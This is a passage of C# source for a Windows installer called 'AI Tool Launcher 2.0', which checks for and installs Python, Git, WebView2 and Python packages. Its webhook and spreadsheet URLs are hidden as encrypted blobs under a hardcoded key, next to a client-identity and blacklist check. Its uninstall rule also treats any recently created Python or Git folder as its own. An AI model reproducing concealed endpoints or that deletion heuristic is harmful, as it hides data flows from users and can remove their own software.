using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.Collections.Generic;
using Microsoft.Win32;

[assembly: System.Reflection.AssemblyTitle("AI Tool Launcher 2.0 Setup")]
[assembly: System.Reflection.AssemblyProduct("AI Tool Launcher 2.0")]
[assembly: System.Reflection.AssemblyDescription("AI Tool Launcher 2.0 專屬輕量現代化安裝與環境管理引導程式")]
[assembly: System.Reflection.AssemblyVersion("2.1.2.0")]
[assembly: System.Reflection.AssemblyFileVersion("2.1.2.0")]

namespace AIToolLauncherSetupV2
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new ModernInstallerForm());
        }
    }

    public class EnvComponentInfo
    {
        public string Name { get; set; }
        public string DisplayText { get; set; }
        public string Path { get; set; }
        public bool IsInstalled { get; set; }
        public bool IsInstalledByUs { get; set; }
        public string OriginTag { get; set; }
        public Color TagColor { get; set; }

        public EnvComponentInfo()
        {
            Name = "";
            DisplayText = "檢測中...";
            Path = "";
            IsInstalled = false;
            IsInstalledByUs = false;
            OriginTag = "檢測中";
            TagColor = Color.Gray;
        }
    }

    public class PackageDetailItem
    {
        public string PackageName { get; set; }
        public string DisplayName { get; set; }
        public string Category { get; set; }
        public bool IsInstalled { get; set; }
        public string Version { get; set; }

        public PackageDetailItem(string pkg, string disp, string cat)
        {
            PackageName = pkg;
            DisplayName = disp;
            Category = cat;
            IsInstalled = false;
            Version = "";
        }
    }

    public class ModernInstallerForm : Form
    {
        // ==========================================
        // Windows API (支援視窗拖曳與陰影效果)
        // ==========================================
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HT_CAPTION = 0x2;

        // ==========================================
        // 色彩體系 (Cyberpunk Dark / Fluent Modern)
        // ==========================================
        private readonly Color ColBg = Color.FromArgb(13, 15, 24);             // 深太空黑
        private readonly Color ColCardBg = Color.FromArgb(22, 25, 38);         // 卡片深紫灰
        private readonly Color ColCardBorder = Color.FromArgb(42, 47, 68);     // 卡片微光邊框
        private readonly Color ColAccentBlue = Color.FromArgb(59, 130, 246);    // 亮藍
        private readonly Color ColAccentPurple = Color.FromArgb(139, 92, 246); // 紫色漸層
        private readonly Color ColAccentCyan = Color.FromArgb(6, 182, 212);     // 青色發光
        private readonly Color ColTextPrimary = Color.FromArgb(248, 250, 252); // 高亮主文字
        private readonly Color ColTextMuted = Color.FromArgb(148, 163, 184);   // 次要文字
        private readonly Color ColSuccess = Color.FromArgb(52, 211, 153);      // 翡翠綠
        private readonly Color ColWarning = Color.FromArgb(251, 191, 36);      // 琥珀金
        private readonly Color ColDanger = Color.FromArgb(248, 113, 113);      // 警示紅

        // UI 元件
        private Panel pnlTitleBar;
        private Label lblAppTitle;
        private Label lblAppBadge;
        private Button btnClose;
        private Button btnMinimize;

        // 1. 環境狀態卡片 (含 8 大依賴詳細清單)
        private Panel pnlEnvCard;
        private Button btnRefreshEnv;
        private Button btnUninstallEnv;
        private Label lblEnvPy;
        private Label lblEnvGit;
        private Label lblEnvWv;
        private Label lblPkgSectionTitle;

        // 8 個獨立套件 Label
        private Label lblPkgPySide6;
        private Label lblPkgFluent;
        private Label lblPkgFrameless;
        private Label lblPkgWin32;
        private Label lblPkgWebview;
        private Label lblPkgRequests;
        private Label lblPkgGdown;
        private Label lblPkgPillow;

        // 2. 安裝路徑卡片
        private Panel pnlPathCard;
        private TextBox txtInstallPath;
        private Button btnBrowse;

        // 3. 模組選項卡片
        private Panel pnlOptionsCard;
        private CheckBox chkInstallSMU;
        private CheckBox chkShortcut;
        private CheckBox chkInstallGit;

        // 4. 動態步驟進度卡片
        private Panel pnlProgressCard;
        private Label[] stepBadges;
        private ModernProgressBar prgBar;
        private Label lblStatus;
        private Button btnAction;

        // 5. 終端日誌控制台
        private Panel pnlConsoleCard;
        private RichTextBox rtbConsole;

        // 核心設定與 URL
        private static readonly byte[] SecretKey = Encoding.UTF8.GetBytes("AIToolLauncherSecretKey2026");
        private const string EncryptedWebhookBlob = "KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUBrXVBGUEJ7UEAHBwQFcnt7KzgcelBEKCE7XRkLJ1EbKyEhVU1DdQJdNywmAFdbKVg0XhlYFkYLLTkLUSIMLzZqfWB6OARhPBtedQglIxsbVSsgLwQ=";
        private const string EncryptedSheetBlob = "KT0gHxxWY04RAQAbSxU8CgQeAFooChQdQ0JEJCgwHAcJKRUGQQdHVCQ6VVUgJgECVTBgAmhmFQMLWwE/AC85FFMCKz5gNQ8oLhsqJhRiUwZcFwR7ChccIxMBUQUHFx8yEV4RFgI=";

        private const string RepoZipUrl = "https://github.com/JiaSai67/AIToolLauncher/archive/refs/heads/main.zip";
        private const string SmuZipUrl = "https://github.com/JiaSai67/SteamManifestUpdater/archive/refs/heads/main.zip";
        private const string PythonInstallerUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe";
        private const string MinGitZipUrl = "https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/MinGit-2.44.0-64-bit.zip";

        private ClientIdentity identity;
        private bool isInstalling = false;
        private bool isCompleted = false;

        // 環境組件狀態暫存
        private EnvComponentInfo envPy = new EnvComponentInfo();
        private EnvComponentInfo envGit = new EnvComponentInfo();
        private EnvComponentInfo envWv = new EnvComponentInfo();

        // 8 大套件資料庫
        private List<PackageDetailItem> packageList = new List<PackageDetailItem>()
        {
            new PackageDetailItem("PySide6", "PySide6 (Qt核心介面)", "ToolLauncher"),
            new PackageDetailItem("PySide6-Fluent-Widgets", "Fluent-Widgets (微軟美化組件)", "ToolLauncher"),
            new PackageDetailItem("PySideSix-Frameless-Window", "Frameless-Window (無邊框視窗)", "ToolLauncher"),
            new PackageDetailItem("pywin32", "pywin32 (Windows底層API控制)", "ToolLauncher"),
            new PackageDetailItem("pywebview", "pywebview (Chromium輕量核心)", "通用/SMU"),
            new PackageDetailItem("requests", "requests (網路通訊與更新)", "通用/SMU"),
            new PackageDetailItem("gdown", "gdown (GoogleDrive分流支援)", "SMU專屬"),
            new PackageDetailItem("Pillow", "Pillow (PIL圖像與色彩處理)", "SMU專屬")
        };

        public ModernInstallerForm()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
            this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
            this.UpdateStyles();

            InitializeForm();
            InitializeIdentity();
            CheckBlacklistAsync();

            // 啟動時即刻啟動高精確度非同步環境檢測
            RefreshEnvironmentStatusAsync();
        }

        private void InitializeForm()
        {
            this.Text = "AI Tool Launcher 2.0 - 輕量極速安裝中心";
            this.Size = new Size(760, 960);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = ColBg;
            this.ForeColor = ColTextPrimary;
            this.Font = new Font("Microsoft JhengHei UI", 9.5F, FontStyle.Regular);

            // ==========================================
            // 1. 頂部現代標題列與品牌 Banner (H: 76)
            // ==========================================
            pnlTitleBar = new Panel();
            pnlTitleBar.Dock = DockStyle.Top;
            pnlTitleBar.Height = 76;
            pnlTitleBar.BackColor = Color.FromArgb(17, 20, 32);
            pnlTitleBar.MouseDown += (s, e) =>
            {
                if (e.Button == MouseButtons.Left)
                {
                    ReleaseCapture();
                    SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
                }
            };
            this.Controls.Add(pnlTitleBar);

            btnClose = CreateHeaderButton("✕", new Point(715, 12), (s, e) => this.Close());
            btnMinimize = CreateHeaderButton("—", new Point(675, 12), (s, e) => this.WindowState = FormWindowState.Minimized);
            pnlTitleBar.Controls.Add(btnClose);
            pnlTitleBar.Controls.Add(btnMinimize);

            lblAppTitle = new Label();
            lblAppTitle.Text = "⚡ AI Tool Launcher";
            lblAppTitle.Font = new Font("Segoe UI", 17F, FontStyle.Bold);
            lblAppTitle.ForeColor = ColTextPrimary;
            lblAppTitle.Location = new Point(22, 20);
            lblAppTitle.AutoSize = true;
            pnlTitleBar.Controls.Add(lblAppTitle);

            lblAppBadge = new Label();
            lblAppBadge.Text = " v2.0 Setup & Env Diagnostics ";
            lblAppBadge.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
            lblAppBadge.BackColor = Color.FromArgb(88, 86, 214);
            lblAppBadge.ForeColor = Color.White;
            lblAppBadge.Location = new Point(275, 26);
            lblAppBadge.Padding = new Padding(5, 2, 5, 2);
            lblAppBadge.AutoSize = true;
            pnlTitleBar.Controls.Add(lblAppBadge);

            // ==========================================
            // 2. 核心環境狀態檢測與 8 大依賴詳細清單卡片 (H: 235)
            // ==========================================
            pnlEnvCard = CreateCardPanel(20, 85, 720, 235);
            this.Controls.Add(pnlEnvCard);

            Label lblEnvTitle = new Label();
            lblEnvTitle.Text = "📊 系統環境與 8 大核心依賴套件完整狀態 (即時偵測)：";
            lblEnvTitle.Font = new Font("Microsoft JhengHei UI", 9.5F, FontStyle.Bold);
            lblEnvTitle.ForeColor = ColAccentCyan;
            lblEnvTitle.Location = new Point(15, 10);
            lblEnvTitle.AutoSize = true;
            pnlEnvCard.Controls.Add(lblEnvTitle);

            btnRefreshEnv = new Button();
            btnRefreshEnv.Text = "🔄 重新檢測";
            btnRefreshEnv.Font = new Font("Microsoft JhengHei UI", 8.5F, FontStyle.Bold);
            btnRefreshEnv.Size = new Size(100, 26);
            btnRefreshEnv.Location = new Point(465, 7);
            btnRefreshEnv.BackColor = Color.FromArgb(37, 42, 65);
            btnRefreshEnv.ForeColor = ColTextPrimary;
            btnRefreshEnv.FlatStyle = FlatStyle.Flat;
            btnRefreshEnv.FlatAppearance.BorderColor = ColCardBorder;
            btnRefreshEnv.Cursor = Cursors.Hand;
            btnRefreshEnv.Click += (s, e) => RefreshEnvironmentStatusAsync();
            pnlEnvCard.Controls.Add(btnRefreshEnv);

            btnUninstallEnv = new Button();
            btnUninstallEnv.Text = "🗑️ 一鍵安全卸載";
            btnUninstallEnv.Font = new Font("Microsoft JhengHei UI", 8.5F, FontStyle.Bold);
            btnUninstallEnv.Size = new Size(135, 26);
            btnUninstallEnv.Location = new Point(572, 7);
            btnUninstallEnv.BackColor = Color.FromArgb(55, 25, 35);
            btnUninstallEnv.ForeColor = ColDanger;
            btnUninstallEnv.FlatStyle = FlatStyle.Flat;
            btnUninstallEnv.FlatAppearance.BorderColor = Color.FromArgb(120, 45, 55);
            btnUninstallEnv.Cursor = Cursors.Hand;
            btnUninstallEnv.Click += BtnUninstallEnv_Click;
            pnlEnvCard.Controls.Add(btnUninstallEnv);

            // 基礎環境 3 列
            lblEnvPy = CreateEnvItemLabel(18, 36, 685, 24);
            lblEnvGit = CreateEnvItemLabel(18, 61, 685, 24);
            lblEnvWv = CreateEnvItemLabel(18, 86, 685, 24);

            pnlEnvCard.Controls.Add(lblEnvPy);
            pnlEnvCard.Controls.Add(lblEnvGit);
            pnlEnvCard.Controls.Add(lblEnvWv);

            // 8 大依賴詳細清單區域分隔標題
            lblPkgSectionTitle = new Label();
            lblPkgSectionTitle.Text = "📦 8 大核心依賴套件明細 (ToolLauncher 6 項 + SMU 4 項，無任何省略濃縮)：";
            lblPkgSectionTitle.Font = new Font("Microsoft JhengHei UI", 8.5F, FontStyle.Bold);
            lblPkgSectionTitle.ForeColor = ColAccentCyan;
            lblPkgSectionTitle.Location = new Point(15, 114);
            lblPkgSectionTitle.AutoSize = true;
            pnlEnvCard.Controls.Add(lblPkgSectionTitle);

            // 8 個獨立套件 Label (2 欄 x 4 列)
            int col1X = 20, col2X = 370;
            int rowY1 = 136, rowY2 = 159, rowY3 = 182, rowY4 = 205;
            int colW = 340;

            lblPkgPySide6 = CreateEnvItemLabel(col1X, rowY1, colW, 22);
            lblPkgFluent = CreateEnvItemLabel(col1X, rowY2, colW, 22);
            lblPkgFrameless = CreateEnvItemLabel(col1X, rowY3, colW, 22);
            lblPkgWin32 = CreateEnvItemLabel(col1X, rowY4, colW, 22);

            lblPkgWebview = CreateEnvItemLabel(col2X, rowY1, colW, 22);
            lblPkgRequests = CreateEnvItemLabel(col2X, rowY2, colW, 22);
            lblPkgGdown = CreateEnvItemLabel(col2X, rowY3, colW, 22);
            lblPkgPillow = CreateEnvItemLabel(col2X, rowY4, colW, 22);

            pnlEnvCard.Controls.Add(lblPkgPySide6);
            pnlEnvCard.Controls.Add(lblPkgFluent);
            pnlEnvCard.Controls.Add(lblPkgFrameless);
            pnlEnvCard.Controls.Add(lblPkgWin32);
            pnlEnvCard.Controls.Add(lblPkgWebview);
            pnlEnvCard.Controls.Add(lblPkgRequests);
            pnlEnvCard.Controls.Add(lblPkgGdown);
            pnlEnvCard.Controls.Add(lblPkgPillow);

            // ==========================================
            // 3. 安裝路徑卡片 (H: 70)
            // ==========================================
            string defaultInstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher");

            pnlPathCard = CreateCardPanel(20, 328, 720, 70);
            this.Controls.Add(pnlPathCard);

            Label lblPathTitle = new Label();
            lblPathTitle.Text = "📁 安裝路徑 (免提權，每台電腦皆具備完整讀寫權限)：";
            lblPathTitle.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Bold);
            lblPathTitle.ForeColor = ColAccentCyan;
            lblPathTitle.Location = new Point(15, 8);
            lblPathTitle.AutoSize = true;
            pnlPathCard.Controls.Add(lblPathTitle);

            txtInstallPath = new TextBox();
            txtInstallPath.Text = defaultInstallPath;
            txtInstallPath.Font = new Font("Consolas", 10F);
            txtInstallPath.BackColor = Color.FromArgb(13, 15, 24);
            txtInstallPath.ForeColor = ColTextPrimary;
            txtInstallPath.BorderStyle = BorderStyle.FixedSingle;
            txtInstallPath.Location = new Point(18, 31);
            txtInstallPath.Size = new Size(575, 27);
            pnlPathCard.Controls.Add(txtInstallPath);

            btnBrowse = new Button();
            btnBrowse.Text = "📂 瀏覽...";
            btnBrowse.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Bold);
            btnBrowse.Size = new Size(95, 27);
            btnBrowse.Location = new Point(603, 31);
            btnBrowse.BackColor = Color.FromArgb(37, 42, 65);
            btnBrowse.ForeColor = ColTextPrimary;
            btnBrowse.FlatStyle = FlatStyle.Flat;
            btnBrowse.FlatAppearance.BorderColor = ColCardBorder;
            btnBrowse.Cursor = Cursors.Hand;
            btnBrowse.Click += BtnBrowse_Click;
            pnlPathCard.Controls.Add(btnBrowse);

            // ==========================================
            // 4. 模組與依賴選項卡片 (H: 68)
            // ==========================================
            pnlOptionsCard = CreateCardPanel(20, 406, 720, 68);
            this.Controls.Add(pnlOptionsCard);

            chkInstallSMU = CreateCheckbox("🎮 預先安裝 SteamManifestUpdater (SMU 2.0)", new Point(18, 9), true);
            chkShortcut = CreateCheckbox("🖥️ 於桌面建立專屬啟動捷徑 (雙捷徑)", new Point(18, 36), true);
            chkInstallGit = CreateCheckbox("🐙 自動配置 Git 環境 (必選：保障主程式與小工具自動檢查更新)", new Point(365, 9), true);

            pnlOptionsCard.Controls.Add(chkInstallSMU);
            pnlOptionsCard.Controls.Add(chkShortcut);
            pnlOptionsCard.Controls.Add(chkInstallGit);

            // ==========================================
            // 5. 動態步驟進度卡片 (H: 145)
            // ==========================================
            pnlProgressCard = CreateCardPanel(20, 482, 720, 145);
            this.Controls.Add(pnlProgressCard);

            string[] stepNames = { "① 環境檢測", "② 核心主體", "③ 介面依賴", "④ SMU 部署", "⑤ 完成啟動" };
            stepBadges = new Label[5];
            int stepX = 15;
            for (int i = 0; i < 5; i++)
            {
                Label b = new Label();
                b.Text = stepNames[i];
                b.Font = new Font("Microsoft JhengHei UI", 8.5F, FontStyle.Bold);
                b.ForeColor = ColTextMuted;
                b.BackColor = Color.FromArgb(17, 20, 32);
                b.Padding = new Padding(6, 4, 6, 4);
                b.Location = new Point(stepX, 9);
                b.AutoSize = true;
                pnlProgressCard.Controls.Add(b);
                stepBadges[i] = b;
                stepX += 138;
            }

            prgBar = new ModernProgressBar();
            prgBar.Location = new Point(18, 41);
            prgBar.Size = new Size(684, 22);
            prgBar.Value = 0;
            pnlProgressCard.Controls.Add(prgBar);

            lblStatus = new Label();
            lblStatus.Text = "就緒：請確認環境檢測狀態與選項，點擊下方「一鍵極速安裝」開始。";
            lblStatus.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Regular);
            lblStatus.ForeColor = ColAccentCyan;
            lblStatus.Location = new Point(18, 70);
            lblStatus.AutoSize = true;
            pnlProgressCard.Controls.Add(lblStatus);

            btnAction = new Button();
            btnAction.Text = "⚡ 一鍵極速安裝 (Express Setup)";
            btnAction.Font = new Font("Microsoft JhengHei UI", 11.5F, FontStyle.Bold);
            btnAction.Size = new Size(684, 42);
            btnAction.Location = new Point(18, 93);
            btnAction.BackColor = Color.FromArgb(79, 70, 229);
            btnAction.ForeColor = Color.White;
            btnAction.FlatStyle = FlatStyle.Flat;
            btnAction.FlatAppearance.BorderSize = 0;
            btnAction.Cursor = Cursors.Hand;
            btnAction.Click += BtnAction_Click;
            pnlProgressCard.Controls.Add(btnAction);

            // ==========================================
            // 6. 終端日誌控制台 (H: 295)
            // ==========================================
            pnlConsoleCard = CreateCardPanel(20, 635, 720, 305);
            this.Controls.Add(pnlConsoleCard);

            Label lblConsoleTitle = new Label();
            lblConsoleTitle.Text = "💻 即時安裝與控制台終端日誌：";
            lblConsoleTitle.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Bold);
            lblConsoleTitle.ForeColor = ColTextMuted;
            lblConsoleTitle.Location = new Point(15, 7);
            lblConsoleTitle.AutoSize = true;
            pnlConsoleCard.Controls.Add(lblConsoleTitle);

            rtbConsole = new RichTextBox();
            rtbConsole.Location = new Point(15, 27);
            rtbConsole.Size = new Size(690, 268);
            rtbConsole.BackColor = Color.FromArgb(9, 10, 16);
            rtbConsole.ForeColor = Color.FromArgb(203, 213, 225);
            rtbConsole.Font = new Font("Consolas", 9F, FontStyle.Regular);
            rtbConsole.ReadOnly = true;
            rtbConsole.BorderStyle = BorderStyle.None;
            rtbConsole.ScrollBars = RichTextBoxScrollBars.Vertical;
            pnlConsoleCard.Controls.Add(rtbConsole);

            Log("AI Tool Launcher 2.0 專屬引導安裝與環境管理中心初始化完成。", ColAccentCyan);
            Log(string.Format("本安裝器基準時間戳記: {0:yyyy-MM-dd HH:mm:ss} (前3天內部屬之環境支援一鍵卸載，其餘判定為時間範圍之外)", GetInstallerBaseTime()), ColTextMuted);
        }

        // ==========================================
        // UI 輔助建立方法
        // ==========================================
        private Label CreateEnvItemLabel(int x, int y, int w, int h)
        {
            Label lbl = new Label();
            lbl.Location = new Point(x, y);
            lbl.Size = new Size(w, h);
            lbl.Font = new Font("Microsoft JhengHei UI", 8.8F, FontStyle.Regular);
            lbl.ForeColor = ColTextPrimary;
            lbl.TextAlign = ContentAlignment.MiddleLeft;
            return lbl;
        }

        private Panel CreateCardPanel(int x, int y, int w, int h)
        {
            Panel p = new Panel();
            p.Location = new Point(x, y);
            p.Size = new Size(w, h);
            p.BackColor = ColCardBg;
            p.Paint += (s, e) =>
            {
                using (Pen pen = new Pen(ColCardBorder, 1))
                {
                    e.Graphics.DrawRectangle(pen, 0, 0, w - 1, h - 1);
                }
            };
            return p;
        }

        private CheckBox CreateCheckbox(string text, Point loc, bool isChecked)
        {
            CheckBox cb = new CheckBox();
            cb.Text = text;
            cb.Location = loc;
            cb.AutoSize = true;
            cb.Checked = isChecked;
            cb.ForeColor = ColTextPrimary;
            cb.Font = new Font("Microsoft JhengHei UI", 9.2F);
            cb.Cursor = Cursors.Hand;
            return cb;
        }

        private Button CreateHeaderButton(string text, Point loc, EventHandler onClick)
        {
            Button btn = new Button();
            btn.Text = text;
            btn.Location = loc;
            btn.Size = new Size(32, 26);
            btn.FlatStyle = FlatStyle.Flat;
            btn.FlatAppearance.BorderSize = 0;
            btn.BackColor = Color.Transparent;
            btn.ForeColor = ColTextMuted;
            btn.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
            btn.Cursor = Cursors.Hand;
            btn.Click += onClick;
            btn.MouseEnter += (s, e) => btn.ForeColor = Color.White;
            btn.MouseLeave += (s, e) => btn.ForeColor = ColTextMuted;
            return btn;
        }

        private void SetStepActive(int stepIndex, bool completed = false)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetStepActive(stepIndex, completed)));
                return;
            }

            for (int i = 0; i < stepBadges.Length; i++)
            {
                if (i < stepIndex || (i == stepIndex && completed))
                {
                    stepBadges[i].ForeColor = ColSuccess;
                    stepBadges[i].BackColor = Color.FromArgb(20, 45, 35);
                }
                else if (i == stepIndex)
                {
                    stepBadges[i].ForeColor = Color.White;
                    stepBadges[i].BackColor = Color.FromArgb(79, 70, 229);
                }
                else
                {
                    stepBadges[i].ForeColor = ColTextMuted;
                    stepBadges[i].BackColor = Color.FromArgb(17, 20, 32);
                }
            }
        }

        private void Log(string message, Color color)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => Log(message, color)));
                return;
            }
            rtbConsole.SelectionStart = rtbConsole.TextLength;
            rtbConsole.SelectionLength = 0;
            rtbConsole.SelectionColor = color;
            rtbConsole.AppendText(string.Format("[{0:HH:mm:ss}] {1}\n", DateTime.Now, message));
            rtbConsole.ScrollToCaret();
        }

        private void SetStatus(string text, Color color)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetStatus(text, color)));
                return;
            }
            lblStatus.Text = text;
            lblStatus.ForeColor = color;
        }

        private void SetProgress(int percent)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetProgress(percent)));
                return;
            }
            prgBar.Value = Math.Max(0, Math.Min(100, percent));
        }

        private void BtnBrowse_Click(object sender, EventArgs e)
        {
            if (isInstalling) return;
            using (FolderBrowserDialog fbd = new FolderBrowserDialog())
            {
                fbd.Description = "請選擇 AI Tool Launcher 2.0 的安裝目錄：";
                fbd.SelectedPath = txtInstallPath.Text;
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    txtInstallPath.Text = fbd.SelectedPath;
                }
            }
        }

        // ==========================================
        // 核心安全機制：時間判定與安裝基準點
        // ==========================================
        private DateTime GetInstallerBaseTime()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                DateTime cTime = File.GetCreationTime(exePath);
                DateTime wTime = File.GetLastWriteTime(exePath);
                DateTime baseT = cTime < wTime ? cTime : wTime;

                string manifestFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher", "install_manifest.json");
                if (File.Exists(manifestFile))
                {
                    string txt = File.ReadAllText(manifestFile, Encoding.UTF8);
                    Match m = Regex.Match(txt, "\"installer_first_run\":\\s*\"([^\"]+)\"");
                    if (m.Success)
                    {
                        DateTime recordT;
                        if (DateTime.TryParse(m.Groups[1].Value, out recordT))
                        {
                            if (recordT < baseT) baseT = recordT;
                        }
                    }
                }
                return baseT;
            }
            catch
            {
                return DateTime.Now;
            }
        }

        // ==========================================
        // 環境狀態非同步檢測 (100% 精確逐一偵測)
        // ==========================================
        private void RefreshEnvironmentStatusAsync()
        {
            btnRefreshEnv.Enabled = false;
            btnRefreshEnv.Text = "⏳ 檢測中...";

            Thread t = new Thread(() =>
            {
                try
                {
                    DateTime baseTime = GetInstallerBaseTime();
                    string manifestFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher", "install_manifest.json");
                    string manifestContent = File.Exists(manifestFile) ? File.ReadAllText(manifestFile, Encoding.UTF8) : "";

                    // 1. 檢測 Python 執行環境
                    envPy = DetectPythonComponent(baseTime, manifestContent);

                    // 2. 檢測 Git 版本控制
                    envGit = DetectGitComponent(baseTime, manifestContent);

                    // 3. 檢測 WebView2 執行階段 (含精確 GUID 與檔案路徑)
                    envWv = DetectWebView2Component();

                    // 4. 逐一檢測 8 大相依套件 (透過 pip list --format=json 高速精準提取版本)
                    DetectAllDetailedPackages(envPy.Path);

                    int readyCount = 0;
                    foreach (var p in packageList) { if (p.IsInstalled) readyCount++; }

                    this.Invoke(new Action(() =>
                    {
                        UpdateEnvironmentUI();
                        btnRefreshEnv.Enabled = true;
                        btnRefreshEnv.Text = "🔄 重新檢測";
                        Log(string.Format("環境檢測完成：Python/Git/WebView2 已就緒，8 大核心依賴套件已確認就緒 {0}/8 項。", readyCount), ColSuccess);
                    }));
                }
                catch (Exception ex)
                {
                    this.Invoke(new Action(() =>
                    {
                        btnRefreshEnv.Enabled = true;
                        btnRefreshEnv.Text = "🔄 重新檢測";
                        Log("檢測環境發生微小異常: " + ex.Message, ColWarning);
                    }));
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        private EnvComponentInfo DetectPythonComponent(DateTime baseTime, string manifest)
        {
            EnvComponentInfo info = new EnvComponentInfo();
            info.Name = "Python 官方環境";

            string pyExe = ResolvePythonExecutable();
            if (string.IsNullOrEmpty(pyExe) || !File.Exists(pyExe))
            {
                info.IsInstalled = false;
                info.DisplayText = "未檢測到 Python 3.10+ (安裝時將為您自動配置 3.11.9)";
                info.OriginTag = "❌ 尚未安裝";
                info.TagColor = ColWarning;
                return info;
            }

            info.IsInstalled = true;
            info.Path = pyExe;

            string ver = GetCommandOutput(pyExe, "--version");
            if (string.IsNullOrEmpty(ver)) ver = "Python 3.x";

            string pyDir = Path.GetDirectoryName(pyExe) ?? "";
            DateTime dirCreation = Directory.Exists(pyDir) ? Directory.GetCreationTime(pyDir) : File.GetCreationTime(pyExe);

            bool markedInManifest = manifest.Contains("\"installed_by_launcher\": true") && manifest.Contains("Python");
            DateTime thresholdTime = baseTime.AddDays(-3);
            bool isRecent = (dirCreation >= thresholdTime);

            if (markedInManifest || isRecent)
            {
                info.IsInstalledByUs = true;
                info.DisplayText = string.Format("{0} ({1})", ver, pyExe);
                info.OriginTag = "📦 近期部署 (可一鍵刪除)";
                info.TagColor = ColAccentCyan;
            }
            else
            {
                info.IsInstalledByUs = false;
                info.DisplayText = string.Format("{0} ({1})", ver, pyExe);
                info.OriginTag = "🛡️ 時間範圍之外 (安全保護中)";
                info.TagColor = ColSuccess;
            }
            return info;
        }

        private EnvComponentInfo DetectGitComponent(DateTime baseTime, string manifest)
        {
            EnvComponentInfo info = new EnvComponentInfo();
            info.Name = "Git 版本控制";

            string gitExe = ResolveGitExecutable();
            if (string.IsNullOrEmpty(gitExe) || !File.Exists(gitExe))
            {
                info.IsInstalled = false;
                info.DisplayText = "未檢測到 Git (自動更新核心組件，勾選下方選項自動安裝)";
                info.OriginTag = "❌ 尚未安裝";
                info.TagColor = ColWarning;
                return info;
            }

            info.IsInstalled = true;
            info.Path = gitExe;

            string ver = GetCommandOutput(gitExe, "--version");
            if (string.IsNullOrEmpty(ver)) ver = "Git for Windows";

            string gitDir = Path.GetDirectoryName(Path.GetDirectoryName(gitExe)) ?? "";
            DateTime dirCreation = Directory.Exists(gitDir) ? Directory.GetCreationTime(gitDir) : File.GetCreationTime(gitExe);

            bool markedInManifest = manifest.Contains("\"git_installed_by_launcher\": true");
            DateTime thresholdTimeGit = baseTime.AddDays(-3);
            bool isRecentGit = (dirCreation >= thresholdTimeGit);

            if (markedInManifest || isRecentGit)
            {
                info.IsInstalledByUs = true;
                info.DisplayText = string.Format("{0} ({1})", ver, gitExe);
                info.OriginTag = "📦 近期部署 (可一鍵刪除)";
                info.TagColor = ColAccentCyan;
            }
            else
            {
                info.IsInstalledByUs = false;
                info.DisplayText = string.Format("{0} ({1})", ver, gitExe);
                info.OriginTag = "🛡️ 時間範圍之外 (安全保護中)";
                info.TagColor = ColSuccess;
            }
            return info;
        }

        private EnvComponentInfo DetectWebView2Component()
        {
            EnvComponentInfo info = new EnvComponentInfo();
            info.Name = "WebView2 Runtime";

            string ver = null;
            string installPath = null;
            try
            {
                // 正確官方 WebView2 GUID: {F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}
                string guid = "{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}";
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(string.Format(@"SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{0}", guid)))
                {
                    if (k != null)
                    {
                        ver = k.GetValue("pv") as string;
                        installPath = k.GetValue("location") as string;
                    }
                }
                if (string.IsNullOrEmpty(ver))
                {
                    using (RegistryKey k = Registry.LocalMachine.OpenSubKey(string.Format(@"SOFTWARE\Microsoft\EdgeUpdate\Clients\{0}", guid)))
                    {
                        if (k != null) ver = k.GetValue("pv") as string;
                    }
                }
                if (string.IsNullOrEmpty(ver))
                {
                    using (RegistryKey k = Registry.CurrentUser.OpenSubKey(string.Format(@"Software\Microsoft\EdgeUpdate\Clients\{0}", guid)))
                    {
                        if (k != null) ver = k.GetValue("pv") as string;
                    }
                }
            }
            catch { }

            // 實體目錄檢測備援
            if (string.IsNullOrEmpty(ver) || ver == "0.0.0.0")
            {
                string p1 = @"C:\Program Files (x86)\Microsoft\EdgeWebView\Application";
                string p2 = @"C:\Program Files\Microsoft\EdgeWebView\Application";
                if (Directory.Exists(p1) || Directory.Exists(p2))
                {
                    ver = "系統原生就緒";
                }
            }

            if (!string.IsNullOrEmpty(ver) && ver != "0.0.0.0")
            {
                info.IsInstalled = true;
